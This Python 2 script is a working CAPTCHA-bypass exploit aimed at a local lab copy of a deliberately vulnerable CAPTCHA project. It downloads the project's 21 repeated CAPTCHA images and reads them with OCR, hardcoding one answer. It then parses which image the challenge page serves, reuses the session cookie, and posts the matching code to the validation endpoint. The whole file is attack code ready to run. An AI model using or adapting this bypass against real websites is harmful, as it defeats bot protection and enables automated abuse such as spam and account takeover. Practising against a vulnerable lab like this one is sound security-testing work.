import requests
import pytesseract
import re
import Image

arr=[]
print 'We are making the request to get image...'
for i in range(0,21):
    get_image_url="http://192.168.75.134/Captch-Bypass-Vulnerable-Script-master/TenRepeatedCAPTCHA/"+str(i)+".png"
    request_url=requests.get(get_image_url)
    #print request_url.status_code
    if request_url.status_code==200:
        imgname="E:/test/"+str(i)+".png"
        with open(imgname,'wb') as img:
            img.write(request_url.content)
        img=Image.open(imgname)
        img.load()
        vcode=pytesseract.image_to_string(img)
        #print vcode
        arr.append(vcode)
arr[2]='5803'


url="http://192.168.75.134/Captch-Bypass-Vulnerable-Script-master/TenRepeatedCAPTCHA/captcha.php"
get_url=requests.get(url)
#print get_url.headers
get_cookie=get_url.headers['set-cookie']
#print get_url.content
findimg=re.findall("<img src='(.*).png",get_url.content)
num=int(findimg[0])
#print int(findimg[0]


post_url="http://192.168.75.134/Captch-Bypass-Vulnerable-Script-master/TenRepeatedCAPTCHA/validate.php"
headers={
    'Cookie':get_cookie
}
for i in range(len(arr)+1):
    if num==i:
        print 'The captcha is: '+arr[i]
        print 'We are making the HTTP request to crack the CAPTCHA....'
        print '-------------------------------------------------------'
        data = {
            'captcha': int(arr[i]),
            'submit': 'Submit'
        }
        print data
        print '-------------------------------------------------------'
        response_url=requests.post(url=post_url,headers=headers,data=data)
        print 'The response is....'
        print '-------------------------------------------------------'
        print response_url.content
        print '-------------------------------------------------------'